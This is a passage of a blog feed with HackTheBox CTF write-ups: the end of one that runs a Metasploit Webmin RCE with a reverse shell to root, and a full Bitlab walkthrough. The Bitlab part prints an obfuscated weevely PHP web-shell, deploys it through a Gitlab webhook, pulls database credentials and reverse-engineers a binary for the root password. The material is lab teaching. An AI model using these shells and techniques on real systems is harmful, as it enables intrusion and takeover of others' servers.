exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> RHOSTS 10.10.10.160</span><br><span class="line">RHOSTS =&gt; 10.10.10.160</span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> LHOST 10.10.10.10</span><br><span class="line">LHOST =&gt; 10.10.10.160</span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> username Matt</span><br><span class="line">username =&gt; Matt</span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> password computer2008</span><br><span class="line">password =&gt; computer2008</span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> payload cmd/unix/reverse_python</span><br><span class="line">payload =&gt; cmd/unix/reverse_python</span><br><span class="line"></span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> SSL <span class="literal">true</span></span><br><span class="line">SSL =&gt; <span class="literal">true</span></span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/http/webmin_packageup_rce):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   PASSWORD   computer2008     yes       Webmin Password</span><br><span class="line">   Proxies                     no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS     10.10.10.160     yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line">   RPORT      10000            yes       The target port (TCP)</span><br><span class="line">   SSL        <span class="literal">true</span>             no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI  /                yes       Base path <span class="keyword">for</span> Webmin application</span><br><span class="line">   USERNAME   Matt             yes       Webmin Username</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (cmd/unix/reverse_python):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  10.10.15.123     yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  8585             yes       The listen port</span><br><span class="line">   SHELL  /bin/bash        yes       The system shell to use.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> msf5 exploit(linux/http/webmin_packageup_rce) &gt; check</span><br><span class="line"></span><br><span class="line">[*] NICE! Matt has the right to &gt;&gt;Package Update&lt;&lt;</span><br><span class="line">[+] 10.10.10.160:10000 - The target is vulnerable.</span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.10.10:8585</span><br><span class="line">[+] Session cookie: 0712c463a268f71262aa809eb4f41928</span><br><span class="line">[*] Attempting to execute the payload...</span><br><span class="line">[*] Command shell session 1 opened (10.10.10.10:8585 -&gt; 10.10.10.160:38146) at 2019-11-05 02:07:59 +0100</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">cat /root/root.txt</span><br><span class="line">a2xxxxxxxxxxxxxxxxxxxxxce</span><br></pre></td></tr></table></figure><hr><p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p><p>See you next time ;)</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Easy Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> gobuster </tag>
            
            <tag> john </tag>
            
            <tag> ssh </tag>
            
            <tag> postman </tag>
            
            <tag> webmin </tag>
            
            <tag> redis </tag>
            
            <tag> cve-2019-12840 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Bitlab</title>
      <link href="/posts/bitlab/"/>
      <url>/posts/bitlab/</url>
      
        <content type="html"><![CDATA[<img width="587" alt="bitlab-hackthebox" src="https://user-images.githubusercontent.com/9076747/82153801-02412300-986a-11ea-819e-b4337e7d8310.png"><p>Bitlab box was an interesting box, user part was typical real-life scenario (actually meet this scenario during multiple pentests) while the root part was my first time Reverse Engineering.</p><p><strong>Tl;Dr:</strong> The user part needed you access a Gitlab instance by using credentials leaked by one of the developer. From here you could merge a web-shell that is automatically pulled on the server by a <code>merge_request</code> webhook. Still from the Gitlab instance you find a piece of code with database credentials. With the web-shell as <code>www-data</code> you can pivot to <code>clave</code> user using his password found in the database and get the flag.<br>The root part was reverse engineering of an Windows binary to extract the <code>root</code> account password needed to grab the flag.</p><p>Alright! Let’s get into the details now!</p><hr><p>First we add the box ip to our host file and let’s start!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.114 bitlab.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><h2 id="User-flag"><a href="#User-flag" class="headerlink" title="User flag."></a>User flag.</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -sC bitlab.htb</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-26 02:00 CEST</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    nginx</span><br><span class="line">|_ http-robots.txt: 55 disallowed entries (15 shown)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 96.45 seconds</span><br></pre></td></tr></table></figure><p>We have a classical web app running on port 443 and the ssh port 22 open.</p><p>Opening <code>http://bitlab.htb</code> display the following a gitlab instance :</p><p><img src="https://user-images.githubusercontent.com/9076747/67625187-25eb4000-f82a-11e9-81e9-2541d037031e.png" alt="bitlab homepage"></p><p>Using <code>gobuster</code> to brute force for interesting directories and files won’t be useful here since all urls return a redirect to the login page. We will do the old fashioned way of manual browsing. I will be quick since there is only three links accessible from the main page:</p><ul><li><code>Explore</code> page is empty.</li><li><code>Help</code> show a directory listing for documentation. </li><li><code>bookmarks.html</code> page display what looks like the exported browser bookmarks of the developer.</li></ul><p>The <code>Gitlab - Sign In</code> bookmark looks usual:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">DT</span>&gt;</span><span class="tag">&lt;<span class="name">A</span> <span class="attr">HREF</span>=<span class="string">&quot;javascript:(function()&#123; var _0x4b18=[&quot;</span>\<span class="attr">x76</span>\<span class="attr">x61</span>\<span class="attr">x6C</span>\<span class="attr">x75</span>\<span class="attr">x65</span>&quot;,&quot;\<span class="attr">x75</span>\<span class="attr">x73</span>\<span class="attr">x65</span>\<span class="attr">x72</span>\<span class="attr">x5F</span>\<span class="attr">x6C</span>\<span class="attr">x6F</span>\<span class="attr">x67</span>\<span class="attr">x69</span>\<span class="attr">x6E</span>&quot;,&quot;\<span class="attr">x67</span>\<span class="attr">x65</span>\<span class="attr">x74</span>\<span class="attr">x45</span>\<span class="attr">x6C</span>\<span class="attr">x65</span>\<span class="attr">x6D</span>\<span class="attr">x65</span>\<span class="attr">x6E</span>\<span class="attr">x74</span>\<span class="attr">x42</span>\<span class="attr">x79</span>\<span class="attr">x49</span>\<span class="attr">x64</span>&quot;,&quot;\<span class="attr">x63</span>\<span class="attr">x6C</span>\<span class="attr">x61</span>\<span class="attr">x76</span>\<span class="attr">x65</span>&quot;,&quot;\<span class="attr">x75</span>\<span class="attr">x73</span>\<span class="attr">x65</span>\<span class="attr">x72</span>\<span class="attr">x5F</span>\<span class="attr">x70</span>\<span class="attr">x61</span>\<span class="attr">x73</span>\<span class="attr">x73</span>\<span class="attr">x77</span>\<span class="attr">x6F</span>\<span class="attr">x72</span>\<span class="attr">x64</span>&quot;,&quot;\<span class="attr">x31</span>\<span class="attr">x31</span>\<span class="attr">x64</span>\<span class="attr">x65</span>\<span class="attr">x73</span>\<span class="attr">x30</span>\<span class="attr">x30</span>\<span class="attr">x38</span>\<span class="attr">x31</span>\<span class="attr">x78</span>&quot;];<span class="attr">document</span>[<span class="attr">_0x4b18</span>[<span class="attr">2</span>]](<span class="attr">_0x4b18</span>[<span class="attr">1</span>])[<span class="attr">_0x4b18</span>[<span class="attr">0</span>]]= <span class="string">_0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]</span>= <span class="string">_0x4b18[5];</span> &#125;)()&quot; <span class="attr">ADD_DATE</span>=<span class="string">&quot;1554932142&quot;</span>&gt;</span>Gitlab Login<span class="tag">&lt;/<span class="name">A</span>&gt;</span></span><br></pre></td></tr></table></figure><p>The bookmark is not a classic url but javascript script. This is a useful trick that allow you to run javascript on a given website just by clicking on the bookmark icon.</p><p>Since the js is obfuscated a little let’s open the Gitlab login page and run it onto the console to see what happen :</p><p><img src="https://user-images.githubusercontent.com/9076747/67625306-f6d5ce00-f82b-11e9-84b8-7a47c3ba733b.png" alt="bitlab bookmark script"></p><p>The js script is automatically filling the login form with username <code>clave</code> and a password. While checking network we can see that the password is <code>11des0081x</code>.</p><p>So we have access to one developer Gitlab account. Out of curiosity I tried to SSH with those credentials but without surprise, it didn’t worked. Let’s move on.</p><p>We have access to two repositories :</p><ul><li>Deployer</li><li>Profile</li></ul><p>Seeing by the name we can guess that <code>deployer</code> will be a kind of script to automatically deploy application to the web server. Let’s try to understand the inner working better:</p><p><code>deployer</code> repository hold a single <code>index.php</code> file. The README file explain that it’s a webhook. Reading through the <a href="https://docs.gitlab.com/ee/user/project/integrations/webhooks.html">documentation of gitlab</a> we can understand that a webhook is a function that will call a given url when a event occur on the repository:</p><blockquote><p>Project webhooks allow you to trigger a URL if for example new code is pushed or a new issue is created. You can configure webhooks to listen for specific events like pushes, issues or merge requests. GitLab will send a POST request with data to the webhook URL.</p></blockquote><p>In our case here, we can guess that the repository is configured to make a call to <code>http://bitlab.htb/deployer/index.php</code> when a action is made on the repository (can be commit, merge, pull request, etc…).  </p><p>Let’s take a look at the <code>index.php</code> to understand what action is made once it’s called :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$input</span> = file_get_contents(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="variable">$payload</span>  = json_decode(<span class="variable">$input</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$repo</span> = <span class="variable">$payload</span>-&gt;project-&gt;name ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$event</span> = <span class="variable">$payload</span>-&gt;event_type ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$state</span> = <span class="variable">$payload</span>-&gt;object_attributes-&gt;state ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$branch</span> = <span class="variable">$payload</span>-&gt;object_attributes-&gt;target_branch ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$repo</span>==<span class="string">&#x27;Profile&#x27;</span> &amp;&amp; <span class="variable">$branch</span>==<span class="string">&#x27;master&#x27;</span> &amp;&amp; <span class="variable">$event</span>==<span class="string">&#x27;merge_request&#x27;</span> &amp;&amp; <span class="variable">$state</span>==<span class="string">&#x27;merged&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> shell_exec(<span class="string">&#x27;cd ../profile/; sudo git pull&#x27;</span>),<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;OK\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>This a rather simple script. Judging from the <code>if</code> condition we understand that the script will change directory to <code>../profile/</code> and then make a <code>git pull</code> to get the latest changes on every merged merge request.   </p><p>It’s our luck, because we have control over the <code>profile</code> repository which is available through the Gitlab instance. That means that if we merge a file though a <code>merge_request</code> to the <code>profile</code> repository, the said file will automatically be pulled on the server by the <code>deployer/index.php</code> webhook. That’s the perfect scenario for a web-shell don’t you think? :)</p><h3 id="Web-shell-as-www-data"><a href="#Web-shell-as-www-data" class="headerlink" title="Web-shell as www-data"></a>Web-shell as www-data</h3><p>Through this Gitlab interface we can add a new file to the <code>profile</code> repository, it will be faster than cloning. </p><p>I used <a href="https://github.com/epinna/weevely3"><code>weevely</code></a> to generate a php web-shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python weevely.py generate xxxxxxxx hg8.php</span><br><span class="line">Generated <span class="string">&#x27;hg8.php&#x27;</span> with password <span class="string">&#x27;xxxxxxxx&#x27;</span> of 762 byte size.</span><br><span class="line">[hg8@archbook ~]$ cat hg8.php</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$r</span>=<span class="string">&#x27;$k=&quot;ab+-c7+-377b&quot;;$kh=+-&quot;3b+-25356491d+-a&quot;;$+-kf=&quot;+-be0+-0e7cb757+-b&quot;;$p=+-&quot;w0NSnMM+-i&#x27;</span>;</span><br><span class="line"><span class="variable">$A</span>=<span class="string">&#x27;+-j&#125;;&#125;&#125;r+-e+-tur+-n $o;&#125;if(+-@preg_+-+-matc+-h(&quot;/$kh(+-.+)+-$kf/&quot;,@file_get_+-conten&#x27;</span>;</span><br><span class="line"><span class="variable">$Y</span>=<span class="string">&#x27;;$r+-=@ba+-se64_+-+-encod+-e(@x(@gzcompre+-ss(+-$o),$+-k));print(&quot;$p+-+-$kh$r$kf&quot;);&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$G</span>=<span class="string">&#x27;or($i=0;$i+-&lt;$l+-;+-)&#123;fo+-r($+-j+-=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j++-+-+,$+-i++)&#123;$o.=$t&#123;$i&#125;^$k&#123;$&#x27;</span>;</span><br><span class="line"><span class="variable">$D</span>=<span class="string">&#x27;ba+-s+-e+-64_decode($m[1+-])+-,$k+-)));$o=@ob_get_c+-+-onte+-nts();@ob_en+-d_clean()&#x27;</span>;</span><br><span class="line"><span class="variable">$l</span>=<span class="string">&#x27;ONjCY+-uBR&quot;;funct+-ion x+-($t,$k+-)&#123;$c+-=+-strle+-+-n($k);$l=st+-rlen(+-$t);$o=&quot;+-&quot;;f&#x27;</span>;</span><br><span class="line"><span class="variable">$n</span>=str_replace(<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;AcAreAate_AfuncAtiAon&#x27;</span>);</span><br><span class="line"><span class="variable">$w</span>=<span class="string">&#x27;ts(+-&quot;php:/+-/+-input&quot;),$+-m)==1)&#123;+-@ob_s+-tart()+-;+-@eva+-l(@gzu+-ncompress(@x+-(@&#x27;</span>;</span><br><span class="line"><span class="variable">$W</span>=str_replace(<span class="string">&#x27;+-&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$r</span>.<span class="variable">$l</span>.<span class="variable">$G</span>.<span class="variable">$A</span>.<span class="variable">$w</span>.<span class="variable">$D</span>.<span class="variable">$Y</span>);</span><br><span class="line"><span class="variable">$u</span>=<span class="variable">$n</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$W</span>);<span class="variable">$u</span>();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>After committing our new file to the repository we start a merge request and merge it ourselves since we have enough permissions to do so. </p><p>Our web-shell is now in the <code>profile</code> repository:</p><p><img src="https://user-images.githubusercontent.com/9076747/67625567-7913c180-f82f-11e9-9a78-54c020336a58.png" alt="profile repository webshell"></p><p>If the web-hook worked properly our web shell file should already be on the server, let’s try it out :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python weevely.py http://bitlab.htb/profile/hg8.php htbpassword</span><br><span class="line"></span><br><span class="line">weevely&gt; id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">www-data@bitlab:/var/www/html/profile $</span><br></pre></td></tr></table></figure><p>We are in as user <code>www-data</code>. </p><h3 id="Pivot-www-data-gt-clave-user"><a href="#Pivot-www-data-gt-clave-user" class="headerlink" title="Pivot www-data -&gt; clave user"></a>Pivot www-data -&gt; clave user</h3><p>Let’s do some recon to get the user flag :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@bitlab:/ $ ls /home</span><br><span class="line">clave</span><br><span class="line">www-data@bitlab:/ $ ls -l /home/clave</span><br><span class="line">-r-------- 1 clave clave 13824 Jul 30 19:58 RemoteConnection.exe</span><br><span class="line">-r-------- 1 clave clave    33 Feb 28  2019 user.txt</span><br></pre></td></tr></table></figure><p>The user is <code>clave</code> as well. </p><p>After a bit of recon, it seems that nothing helpful seems to be accessible from <code>www-data</code> user. When nothing can be found, a good strategy is to go back at the beginning to make sure we didn’t forgot anything. Let’s go back to our starting point : Gitlab.</p><p>After searching around and digging a bit more we can find a “Snippet” page under each users profile. On the Developer profile there is a <code>Postgresql</code> snippet with hard-coded credentials:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$db_connection</span> = pg_connect(<span class="string">&quot;host=localhost dbname=profiles user=profiles password=profiles&quot;</span>);</span><br><span class="line"><span class="variable">$result</span> = pg_query(<span class="variable">$db_connection</span>, <span class="string">&quot;SELECT * FROM profiles&quot;</span>);</span><br></pre></td></tr></table></figure><p>Let’s try to dig into the database for useful informations:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@bitlab:/ $ psql profiles profiles</span><br><span class="line">sh: 1: psql: not found</span><br></pre></td></tr></table></figure><p>Since <code>psql</code> is not installed, let’s use the postgresql PHP library. I tweaked the snippet a little to obtain the following scrip :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$db_connection</span> = pg_connect(<span class="string">&quot;host=localhost dbname=profiles user=profiles password=profiles&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$query_result</span> = pg_query(<span class="variable">$db_connection</span>, <span class="string">&quot;SELECT * FROM profiles&quot;</span>);</span><br><span class="line"><span class="variable">$results</span> = pg_fetch_all(<span class="variable">$query_result</span>);</span><br><span class="line">print_r(<span class="variable">$results</span>);</span><br></pre></td></tr></table></figure><p>Running the php script output only one user, <code>clave</code> again and what looks like a <code>base64</code> encoded password:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">www-data@bitlab:/tmp $ php test.php</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [id] =&gt; 1</span><br><span class="line">            [username] =&gt; clave</span><br><span class="line">            [password] =&gt; c3NoLXN0cjBuZy1wQHNz==</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>Decoding the password gives the following:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;c3NoLXN0cjBuZy1wQHNz==&quot;</span> | base64 -di</span><br><span class="line">ssh-str0ng-p@ss</span><br></pre></td></tr></table></figure><p>Awesome, we got the ssh password for user <code>clave</code> let’s go for the user flag:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh clave@bitlab.htb</span><br><span class="line">clave@bitlab.htb<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">Permission denied, please try again.</span></span><br></pre></td></tr></table></figure><p><code>Permission denied</code> that’s disappointing and strange. The database entry clearly state the user is <code>clave</code> (we saw previously that no other user are present on the box). The password itself state ssh… Could it be that it was simply the clear-text password…?</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh clave@bitlab.htb</span><br><span class="line">clave@bitlab.htb<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">Last login: Sun Oct 27 14:26:51 2019 from 10.10.10.10</span></span><br><span class="line"><span class="string">clave@bitlab:~$ cat user.txt</span></span><br><span class="line"><span class="string">1e3fxxxxxxxxxxxxxxxxb8154</span></span><br></pre></td></tr></table></figure><p>That was it, it was easy to loose time on this one but the password was <code>c3NoLXN0cjBuZy1wQHNz==</code> without decoding.</p><p>Time to move to root.</p><h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>The recon part was quite quick, a Windows executable named <code>RemoteConnection.exe</code> was present on the home folder. </p><p>Got a little surprised seeing this in a Linux box but why not after all. It was my first time reverse engineering so it took me a bit of time to gather the right tools and understand how this binary was working.</p><p>Let’s pull it and start the analysis:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ scp clave@bitlab.htb:~/RemoteConnection.exe .</span><br><span class="line">clave@bitlab.htb<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">RemoteConnection.exe               100%   14KB 279.5KB/s   00:00</span></span><br></pre></td></tr></table></figure><h3 id="Reverse-engineering-of-RemoteConnection-exe"><a href="#Reverse-engineering-of-RemoteConnection-exe" class="headerlink" title="Reverse engineering of RemoteConnection.exe"></a>Reverse engineering of RemoteConnection.exe</h3><p>Oddly enough I was able to make it work on <em>any</em> of my virtual machines. Tried Windows 7, 10, x32, x64 everything. </p><p>Every time I got the following error message:</p><blockquote><p>EXCEPTION_ACCESS_VIOLATION</p><p>Ntdll - Inaccesible Address</p></blockquote><p>So if anyone have any idea where this come from and how to fix please leave a comment.</p><p>Anyway, I managed to borrow a Windows computer just to finish this box.</p><p>The executable is 32-bit, running it display the following:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\hg8\&gt; .\RemoteConnection.exe</span><br><span class="line">Access Denied !! </span><br></pre></td></tr></table></figure><h4 id="Strings"><a href="#Strings" class="headerlink" title="Strings"></a>Strings</h4><p>Running <code>strings</code> on the file doesn’t output a lot of valuable informations: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ strings RemoteConnection.exe</span><br><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</span><br><span class="line">XRIBG0UCDh0HJRcIBh8EEk8aBwdQTAIERVIwFEQ4SDghJUsHJTw1TytWFkwPVgQ2RztS</span><br><span class="line">parse</span><br><span class="line">Access Denied !!</span><br><span class="line">string too long</span><br><span class="line">invalid string position</span><br><span class="line">GetUserNameW</span><br><span class="line">ShellExecuteW</span><br><span class="line">SHELL32.dll</span><br></pre></td></tr></table></figure><p>We can see <code>GetUserNameW</code> what <em>might</em> be used to retrieve the current Windows session username and <code>ShellExecuteW</code> which is a function to run external command.</p><p>To get more information out of it I will use a debugger. This way maybe we can pull more valuable informations during runtime by reading the memory or even patching the binary to bypass the check leading to <code>Access Denied</code>.</p><h4 id="Debugging"><a href="#Debugging" class="headerlink" title="Debugging"></a>Debugging</h4><p>I will use <a href="https://x64dbg.com/"><code>x32dbg</code></a> since it’s free and open-source. </p><p>After opening our binary we forward run once to arrive to the <code>RemoteConnection.exe</code> entry point:</p><p><img src="https://user-images.githubusercontent.com/9076747/80528522-5907bb00-8996-11ea-9857-427940c42f1a.png" alt="remoteconnection.exe entry point"></p><p>Now let’s extract the referenced strings using the function provided by x32dbg:</p><p><img src="https://user-images.githubusercontent.com/9076747/80528813-d0d5e580-8996-11ea-80e5-8f100149aaec.png" alt="remoteconnexion.exe bitlab strings"></p><p>This is starting to get a bit more interesting. We have a reference to our previous user <code>clave</code> and a reference to <code>putty.exe</code>. Putty is a Windows terminal emulator often used to connect to server through SSH.</p><p>If I could guess so far, the program check using <code>GetUserNameW</code> if the current user is <code>clave</code> and if so it will launch <code>putty.exe</code> using <code>ShellExecuteW</code> to automatically connect to, probably, the root account on Bitlab server. Unfortunately there is still no passwords in those referenced strings.</p><p>Let’s continue digging to see if we can either:</p><ul><li>Reverse the algorithm used to obfuscate the password.</li><li>Patch the binary to launch putty even if the connected user is not <code>clave</code>.</li><li>Read some other interesting strings from memory.</li></ul><p>To start off let’s double-click the <code>L&quot;clave&quot;</code> to see where it’s reference:</p><p><img src="https://user-images.githubusercontent.com/9076747/80529378-ae909780-8997-11ea-9b67-1d56644cfa18.png" alt="clave cmp bitlab"></p><p>Ok so looks like we are on the right track, we have a compare to the <code>clave</code> strings if the comparaison fail we jump to what is probably the <code>Access Denied !!</code> error message, while if the comparaison return true the function continue to the call of <code>putty.exe</code>.</p><h4 id="Breaking"><a href="#Breaking" class="headerlink" title="Breaking"></a>Breaking</h4><p>Let’s put a breakpoint on the <code>clave</code> <code>cmp</code> line to see what’s going on it memory. To do so click the grey circle on the left of the line to turn it red. Then let’s forward once:</p><p><img src="https://user-images.githubusercontent.com/9076747/80529782-42fafa00-8998-11ea-8bcc-5e13388f7ae5.png" alt="bitlab remoteconnexion.exe strings password"></p><p>Bingo! Even at the moment of comparing the user the <code>eax</code> already contains the full command passed to Putty.</p><p><img src="https://user-images.githubusercontent.com/9076747/80529850-69b93080-8998-11ea-888c-cdb5253103bd.png" alt="bitlab root credentials remoteconnexion.exe"></p><p>Let’s use the those credentials to login to the root account using SSH:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ssh root@bitlab.htb</span><br><span class="line">root@bitlab.htb<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">Last login: Fri Sep 13 14:11:14 2019</span></span><br><span class="line"><span class="string">root@bitlab:~# id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line"><span class="string">root@bitlab:~# cat root.txt</span></span><br><span class="line"><span class="string">8xxxxxxxxxxxxxxxxxxxxxxxxc</span></span><br></pre></td></tr></table></figure><h2 id="“Unintended”-way-to-root"><a href="#“Unintended”-way-to-root" class="headerlink" title="“Unintended” way to root"></a>“Unintended” way to root</h2><p>While having a shell as <code>www-data</code> we notice an unusual <code>sudo</code> configuration:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">www-data@bitlab:/$ sudo 